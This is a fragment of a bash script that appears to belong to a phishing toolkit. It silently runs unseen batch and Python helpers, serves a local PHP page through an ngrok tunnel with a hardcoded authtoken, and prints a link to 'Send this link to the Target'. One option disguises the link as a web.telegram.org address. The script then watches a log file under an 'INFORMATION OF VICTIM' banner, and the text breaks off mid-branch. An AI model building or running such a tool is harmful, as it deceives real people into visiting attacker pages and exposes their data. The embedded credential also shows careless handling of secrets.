printf "\e[1;92m

 ██████╗  ██████╗ ██╗    ██╗███╗   ██╗██╗      ██████╗  █████╗ ██████╗ 
██╔══██╗██╔═══██╗██║    ██║████╗  ██║██║     ██╔═══██╗██╔══██╗██╔══██╗
██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║██║     ██║   ██║███████║██║  ██║
██║  ██║██║   ██║██║███╗██║██║╚██╗██║██║     ██║   ██║██╔══██║██║  ██║
██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗╚██████╔╝██║  ██║██████╔
                                                            
/n"
printf " \e[1;95m    Download pakege Loading... \n"
start unrar.bat
pip install requests > /dev/null 2>&1
pip install platform > /dev/null 2>&1
pip install sys > /dev/null 2>&1
command -v php > /dev/null 2>&1 || { echo >&2 "I require Php but it's not installed. Install it. Aborting."; exit 1; }
command -v python > /dev/null 2>&1 || { echo >&2 "I require Python but it's not installed. Install it. Aborting."; exit 1; }


echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
						  python sys.py > /dev/null 2>&1
						  sleep 5
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
						  start ngrok authtoken 1pNPp1Tg0trSteYnDWVVocff6gq_2CVCycNZocXS1n3kDL6ye
                          start ngrok.exe http 4444
						  sleep 10
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
						  python link.py https://$link 
                          echo ""
						 
						  clear
                          
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
						  printf "\e[1;92m
 ___  ___   ___   __  __  __  ______  ____ ____   __  __  ___  ______ ___  ___
 ||\\//||  // \\  ||\ || (( \ | || | ||    || \\  ||  || // \\ | || | ||\\//||
 || \/ || ((   )) ||\\||  \\    ||   ||==  ||_//  ||==|| ||=||   ||   || \/ ||
 ||    ||  \\_//  || \|| \_))   ||   ||___ || \\  ||  || || ||   ||   ||    ||
/n"
                          echo "" 
						  echo ""
						  echo ""
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
					
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://web.telegram.org-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt  

                break;
                elif [ $option = 21 ] || [ $option = 21 ]
	        then
